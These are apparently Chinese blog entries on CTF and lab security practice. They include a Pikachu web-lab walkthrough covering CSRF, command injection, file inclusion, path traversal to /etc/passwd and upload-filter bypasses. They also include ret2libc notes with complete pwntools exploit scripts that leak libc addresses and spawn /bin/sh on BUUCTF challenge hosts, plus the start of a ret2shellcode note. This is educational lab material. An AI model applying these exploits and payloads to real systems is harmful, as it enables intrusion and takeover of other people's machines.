<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757895.png" alt="image-20241022141942627" style="zoom:50%;" />

<h4 id="攻击方"><a href="#攻击方" class="headerlink" title="攻击方"></a>攻击方</h4><p>攻击方登录自己账号，点击修改个人信息</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131806543.png" alt="image-20241022142028237" style="zoom:50%;" />

<p>填入要修改的内容，点击<code>submit</code>并进行<code>bp</code>抓包</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757423.png" alt="image-20241022142718284" style="zoom:50%;" />

<p>可以发现，该页面是通过<code>GET</code>传参方式对数据进行修改的</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757399.png" alt="image-20241022142845195"></p>
<p>右键选中<code>Engagement tools-&gt;Generate CSRF PoC</code>，生成<code>CSRF Poc</code>代码</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757604.png" alt="image-20241022143336617" style="zoom:50%;" />

<p>点击<code>Test in browser</code>，复制<code>URL</code>，在浏览器打开</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756736.png" alt="image-20241022143504559" style="zoom: 67%;" />

<p>将当前请求包<code>Drop</code>掉，关闭<code>bp</code>拦截，直接退出登录，<code>vince</code>信息并未被修改</p>
<h4 id="被攻击方"><a href="#被攻击方" class="headerlink" title="被攻击方"></a>被攻击方</h4><p>被攻击方<code>allen</code>登录自己账号，然后来到前面<code>burp</code>生成的网站，点击<code>Submit request</code>，此时被攻击方的个人信息已被成功修改</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756730.png" alt="image-20241022144414264" style="zoom:50%;" />

<h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a><code>CSRF(post)</code></h3><p>该类与前类的区别在于，对于关键数据的传参方式不同，攻击过程同上</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131807839.png" alt="image-20241022144910205" style="zoom:50%;" />

<p>攻击成功，过程不再赘述</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756346.png" alt="image-20241022145016235" style="zoom:50%;" />

<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><code>RCE</code></h2><h3 id="exec-ping"><a href="#exec-ping" class="headerlink" title="exec&quot;ping&quot;"></a><code>exec&quot;ping&quot;</code></h3><p>通过一些命令连接符如<code>||,&amp;,&amp;&amp;</code>，来拼接<code>IP</code>地址和命令，执行我们想要执行的命令。</p>
<h3 id="exec-eval"><a href="#exec-eval" class="headerlink" title="exec&quot;eval&quot;"></a><code>exec&quot;eval&quot;</code></h3><p>这种是直接通过<code>eval()</code>将输入的字符串当作代码来执行。</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含函数：<code>include(),include_once(),require(),require_once()</code></p>
<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a><strong>防范措施</strong></h3><ul>
<li>在功能设计上尽量不要将文件包含函数对应的文件放给前端进行选择和操作。</li>
<li>过滤各种<code>./.</code>，<code>http://</code>，<code>https://</code></li>
<li>配置php.ini配置文件：<code>allow_ url_open = off</code>，<code>Allow_ url include= off</code>，<code>magic quotes_ gpc=on</code> <code> //gpc</code>在</li>
<li>通过白名单策略，仅允许包含运行指定的文件，其他的都禁止。</li>
</ul>
<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>​	这种是仅对服务器本地的文件进行包含，因为服务器上的文件并不是攻击者可以自己控制的，所以该种攻击通常是包含系统的配置文件（如密钥文件），或是配合文件上传漏洞去利用。</p>
<p>​	先随便提交一个数据，然后看<code>url</code>可以发现，<code>filename=</code>这个参数存在文件包含漏洞，我们可以通过这个参数访问本地上的其他文件</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756056.png" alt="image-20241013160223589"></p>
<p>​	在本地查看当前目录，其下有一个<code>file6.php</code>文件，看一下里面的内容，该靶场应该是将该文件作为一个敏感文件</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756713.png" alt="image-20241013160634171" style="zoom:50%;" />

<p>那么接下来我们便可以通过设置<code>url</code>中的<code>filename=file6.php</code>来获取<code>file6.php</code>文件里的敏感数据</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756722.png" alt="image-20241013161053618" style="zoom:50%;" />

<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p><strong>原理：</strong></p>
<p>​	一般当我们点击下载链接，便会向后台发送一个下载请求，这个请求会包含一个需要下载的文件名称，后<br>台在收到请求后，会开始执行下载代码，将该文件对应的文件**<em>response</em>** 给浏览器，从而完成下载。<br>​	如果后台在收到请求的文件名后，将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果攻击者提交的不是一个程序预期的文件名，而是一个精心构造的路径（如<code>../../../etc/passwd</code>），则可能会直接将该指定文件下载下来。从而导致后台敏感信息（密码文件、源代码等）被下载。</p>
<h3 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a><strong>防范措施</strong></h3><ul>
<li>对传入的文件名进行严格的过滤和限定</li>
<li>对文件下载的目录进行严格的限定</li>
</ul>
<p>成功下载了<code>flag.txt</code>文件</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756208.png" alt="image-20241013184458217" style="zoom: 50%;" />

<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a><code>getimagesize</code></h3><p><code>PHP</code>中的<code>getimagesize()</code>函数是一个内置函数，用于获取图像的大小。<code>getimagesize()</code>返回结果中有文件大小和文件类型，如果用这个函数来获取类型，从而判断是否是图片的话，会存在问题。</p>
<p>介绍两个绕过方法：</p>
<ul>
<li>直接伪造头部<code>GIF89A</code></li>
<li>用<code>copy 1.php/a+1.jpg/b 2.jpg</code>命令合成，然后上传<code>2.jpg</code>，再配合文件包含漏洞执行<code>2.jpg</code>中的代码</li>
</ul>
<h2 id="Over-Permission越权"><a href="#Over-Permission越权" class="headerlink" title="Over Permission越权"></a><code>Over Permission</code>越权</h2><p>​	越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
<p>下面来简单认识一下越权操作：</p>
<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>在登录页面登录用户<code>lili</code>的账号</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756536.png" alt="image-20241015124201596" style="zoom:50%;" />

<p>成功登录后，点击查看个人信息</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756584.png" alt="image-20241015124215044" style="zoom:50%;" />

<p>此时会向后台提交一个<code>GET</code>请求，并提供了当前用户的用户名，后台便会将当前用户的信息返回到页面</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131806617.png" alt="image-20241015124237973" style="zoom:50%;" />

<p>当我们修改<code>URL</code>中的<code>username</code>参数为另一个用户名<code>kobe</code>时，页面便会出现<code>kobe</code>用户的信息，也就是说我们无需密码便得到了<code>kobe</code>的个人信息，实现了水平越权</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756191.png" alt="image-20241015124313480" style="zoom:50%;" />

<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>先获取超级用户添加用户的<code>URL</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756384.png" alt="image-20241015141619677" style="zoom:50%;" />

<p>登录<code>pikachu</code>用户</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756333.png" alt="image-20241015141746803" style="zoom:50%;" />

<p>直接替换当前页面的<code>URL</code>为前面保存的<code>URL</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756794.png" alt="image-20241015141905178" style="zoom:50%;" />

<p>现在已经可以通过<code>pikachu</code>用户添加用户          </p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2libc学习总结</title>
    <url>/2023/12/12/ret2libc%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="什么是ret2libc"><a href="#什么是ret2libc" class="headerlink" title="什么是ret2libc"></a>什么是<code>ret2libc</code></h3><p>​	<code>ret2libc</code>即<code>return to libc</code>，即控制程序中函数的返回地址为<code>libc</code>中函数的地址，进而控制程序执行后门函数，拿到<code>shell</code>。</p>
<p>​	这里有一个公式：函数的真实地址 &#x3D; <code>libc</code>库的基地址 + 函数在<code>libc</code>库的地址偏移</p>
<span id="more"></span>

<h3 id="什么是libc"><a href="#什么是libc" class="headerlink" title="什么是libc"></a>什么是<code>libc</code></h3><p>​	<code>libc</code>是<code>c</code>标准库的二进制文件，里面有常用的<code>c</code>语言函数。                                                      </p>
<h3 id="如何寻找地址偏移量"><a href="#如何寻找地址偏移量" class="headerlink" title="如何寻找地址偏移量"></a>如何寻找地址偏移量</h3><p>法1：</p>
<p>使用命令<code>ldd pwn</code>，查看二进制文件<code>pwn</code>在本地的这个环境上依赖的<code>libc</code>库，<code>/lib/x86_64-linux-gnu/libc.so.6</code>是绝对路径。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347333.png" alt="image-20240103151448590"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">system_offset = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_offset = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>法2：</p>
<ul>
<li>在程序中寻找字符串的地址</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn3 --string <span class="string">&#x27;sh&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348729.png" alt="image-20240115152507540"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep <span class="string">&quot;system&quot;</span></span><br><span class="line"><span class="comment">#readelf查找并打印符号表信息</span></span><br><span class="line">strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment">#string查找并打印字符串信息</span></span><br></pre></td></tr></table></figure>

<p>法3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)  <span class="comment">#查找libc版本</span></span><br><span class="line">system_offset = libc.dump(<span class="string">&#x27;system&#x27;</span>)  <span class="comment">#函数地址偏移量</span></span><br></pre></td></tr></table></figure>

<p>法4：</p>
<p>通过已知的某个<code>libc</code>函数的地址，在<a href="https://libc.blukat.me(`ctrl`+点击/">https://libc.blukat.me（`ctrl`+点击</a> 直接跳转）这个网站中查找到对应的<code>libc</code>数据库，可以直接看到地址偏移量。</p>
<h3 id="这里放一个接收函数地址的方式总结："><a href="#这里放一个接收函数地址的方式总结：" class="headerlink" title="这里放一个接收函数地址的方式总结："></a>这里放一个接收函数地址的方式总结：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># p.recvuntil(b&#x27;\n&#x27;)：从输入流中接收数据，直到遇到换行符为止。</span></span><br><span class="line"><span class="comment"># [:-1]：将接收到的数据的最后一个字节（换行符）去除。</span></span><br><span class="line"><span class="comment"># .ljust(8,b&#x27;\0&#x27;)：将剩下的数据用空字节`\0`填充到8字节的长度。s.ljust(width,fillchar)中width为对前面字符串s的填充宽度，fillchar为填充内容。</span></span><br><span class="line"><span class="comment"># u64()：将填充后的8字节数据解析为一个64位的无符号整数。</span></span><br><span class="line">addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="例题1：buu-铁人三项-第五赛区-2018-rop"><a href="#例题1：buu-铁人三项-第五赛区-2018-rop" class="headerlink" title="例题1：buu 铁人三项(第五赛区)_2018_rop"></a>例题<code>1</code>：<code>buu</code> <code>铁人三项(第五赛区)_2018_rop</code></h3><p>查看保护，只开了<code>NX</code>，</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347339.png" alt="image-20231222194215373"></p>
<p>明显栈溢出，</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348996.png" alt="image-20231222193823696"></p>
<p>可以泄漏<code>write</code>函数地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"><span class="comment">#ELF是pwntools库中的函数，用于加载和分析ELF文件。</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]  <span class="comment">#获取main函数地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  <span class="comment">#获取write函数在plt中的地址</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  <span class="comment">#获取write函数的got地址，指向got表中write的真实地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)  </span><br><span class="line">payload += p32(write_plt)  <span class="comment">#调用write函数</span></span><br><span class="line">payload += p32(main_addr)  <span class="comment">#调用完write后的返回地址，要重新在执行一遍主要函数</span></span><br><span class="line">payload += p32(<span class="number">1</span>)  <span class="comment">#write函数第一个参数，标准输出</span></span><br><span class="line">payload += p32(write_got)  <span class="comment">#第二个参数</span></span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))  <span class="comment">#从接收到的数据中提取一个4字节（32 位）的值</span></span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br></pre></td></tr></table></figure>

<p>同理也可以得到<code>read</code>函数的地址，然后我们可以在<a href="https://libc.blukat.me这个网站上,通过`write,read`函数的地址确定`libc`版本,可直接找到一些函数地址偏移量./">https://libc.blukat.me这个网站上，通过`write,read`函数的地址确定`libc`版本，可直接找到一些函数地址偏移量。</a></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348032.png" alt="image-20231221203418960"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28149)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;./2018_rop&#x27;)</span><br><span class="line">#ELF是pwntools库中的函数，用于加载和分析ELF文件。</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]  #获取main函数地址</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]  #获取write函数在plt中的地址</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]  #获取write函数的got地址，指向got表中write的真实地址</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x88+4)  </span><br><span class="line">payload += p32(write_plt)  #调用write函数</span><br><span class="line">payload += p32(main_addr)  #调用完write后的返回地址，要重新在执行一遍主要函数</span><br><span class="line">payload += p32(1)  #write函数第一个参数，标准输出</span><br><span class="line">payload += p32(write_got)  #第二个参数</span><br><span class="line">payload += p32(4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(4))  #从接收到的数据中提取一个4字节（32 位）的值</span><br><span class="line">#print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">write_offset = 0x0e56f0</span><br><span class="line">system_offset = 0x03cd10</span><br><span class="line">str_bin_sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">base_addr = write_addr-write_offset</span><br><span class="line">system_addr = base_addr+system_offset</span><br><span class="line">str_bin_sh_addr = base_addr+str_bin_sh_offset</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(0)+p32(str_bin_sh_addr)</span><br><span class="line">#p32(0)是调用完system函数后的返回地址，但是因为执行完system后会开启一个子进程阻塞当前的进程，system也就不会返回，所以这里可以放任意地址，但是一定要放地址。</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="例题2：buu-jarvisoj-level3"><a href="#例题2：buu-jarvisoj-level3" class="headerlink" title="例题2：buu jarvisoj_level3"></a>例题<code>2</code>：<code>buu</code> <code>jarvisoj_level3</code></h3><p>看保护，只开了<code>NX</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348238.png" alt="image-20231222175342689"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347523.png" alt="image-20231222175522487"></p>
<p>可以泄漏<code>write</code>函数的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#这里可以合并成 p.sendlineafter(b&#x27;Input:\n&#x27;,payload)</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>这里我在网站上没有找到相应的<code>libc</code>版本，不能直接找到函数地址偏移量，但是<code>buu</code>上的题都给了<code>libc</code>版本</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348534.png" alt="image-20231222180314290" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347946.png" alt="image-20231222180348083" style="zoom:80%;" />

<p>知道<code>libc</code>版本后，我们可以通过以下方法找到偏移量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc-2.23.so这个ELF文件要在当前目录下存在，直接在buu上下载即可</span></span><br><span class="line"><span class="comment">#这里定义了libc-2.23.so库的一个对象libc</span></span><br><span class="line"></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#symbol是libc的一个属性，用于存储 libc 中各个符号（函数、变量等）的地址。</span></span><br><span class="line"></span><br><span class="line">str_bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#search()用于在libc中搜索指定字符串的地址。</span></span><br><span class="line"><span class="comment">#next() 是一个内置函数，用于获取一个迭代器的下一个元素。在这里，它用于获取搜索结果中第一个匹配 /bin/sh 的地址。</span></span><br></pre></td></tr></table></figure>

<p><code>exp</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26641</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#这里可以合并成 p.sendlineafter(b&#x27;Input:\n&#x27;,payload)</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#search()用于在libc中搜索指定字符串的地址。</span></span><br><span class="line"><span class="comment">#next() 是一个内置函数，用于获取一个迭代器的下一个元素。在这里，它用于获取搜索结果中第一个匹配 /bin/sh 的地址。</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(str_bin_sh_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="例题3：buu-jarvisoj-level3-x64"><a href="#例题3：buu-jarvisoj-level3-x64" class="headerlink" title="例题3：buu jarvisoj_level3_x64"></a>例题<code>3</code>：<code>buu</code> <code>jarvisoj_level3_x64</code></h3><p>​	该题是<code>64</code>位程序，与第二题只有一处不同。<code>32</code>位通过栈传参，<code>64</code>位通过寄存器传参。故在<code>write</code>函数泄漏和调用<code>system</code>函数的时候需要用寄存器传参。储存参数的前三个寄存器分别为<code>rdi,rsi,rdx</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348901.png" alt="image-20231222200640812"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347028.png" alt="image-20231222200701146"></p>
<p>​	我只找到了前两个寄存器对应的<code>gadget</code>地址，但是这里我们可以利用<code>rdx</code>中的残留值，我们可以看到<code>read</code>调用前，<code>rdx</code>依然保留上一个<code>write</code>函数的参数<code>0x200</code>。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348407.png" alt="image-20240308135618147" style="zoom: 67%;" />

<p><code>exp</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26311</span>)</span><br><span class="line"><span class="comment">#context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x4006b3</span></span><br><span class="line">rsi_addr = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rsi_addr)+p64(write_got)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#因为这里的rsi_addr的地址是pop rsi ; pop r15 ; ret，所以需要有一个p64(0)被放入r15寄存器中</span></span><br><span class="line">payload += p64(write_plt)+p64(mian_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi_addr)+p64(str_bin_sh_addr)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2shellcode学习总结</title>
    <url>/2023/12/09/ret2shellcode%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="什么是ret2shellcode"><a href="#什么是ret2shellcode" class="headerlink" title="什么是ret2shellcode"></a>什么是<code>ret2shellcode</code></h3><p>​	<code>ret2shellcode</code>，即<code>return to shellcode</code>意思是劫持函数返回地址为<code>shellcode</code>的地址，进而控制程序执行<code>shellcode</code>，拿到<code>shell</code>。</p>
<h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a><code>NX</code>保护</h3><span id="more"></span>

<blockquote>
<p>​	<strong><code>NX</code>保护：将数据（堆，栈）所在内存页标识为不可执行，当程序溢出成功转入<code>shellcode</code>时，程序会尝试在数据页面上执行指令，此时<code>cpu</code>就会抛出异常，而不是去执行恶意指令。</strong></p>
</blockquote>
<h4 id="mprotect函数"><a href="#mprotect函数" class="headerlink" title="mprotect函数"></a><code>mprotect</code>函数</h4><ul>
<li><p>开启了<code>NX</code>保护，内存页不能执行。如果能在程序中找到<code>mprotect</code>函数，我们便可利用该函数修改内存页的访问权限，然后便可在内存页写入<code>shellcode</code>，获得<code>shell</code>。</p>
</li>
<li><p>下面是<code>mprotect</code>函数原型</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr,<span class="type">size_t</span> len,<span class="type">int</span> prot)</span>;</span><br><span class="line"><span class="comment">//addr指向要修改的内存页的起始地址，一个内存页大小为4096(0x1000)字节</span></span><br><span class="line"><span class="comment">//len是要修改的内存长度（以字节为单位）</span></span><br><span class="line"><span class="comment">//prot表示要修改成什么权限（4，2，1 可读可写可执行）</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>ida</code>中<code>Ctrl+s</code>可以查看各个段的起始地址</li>
</ul>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a><code>shellcode</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

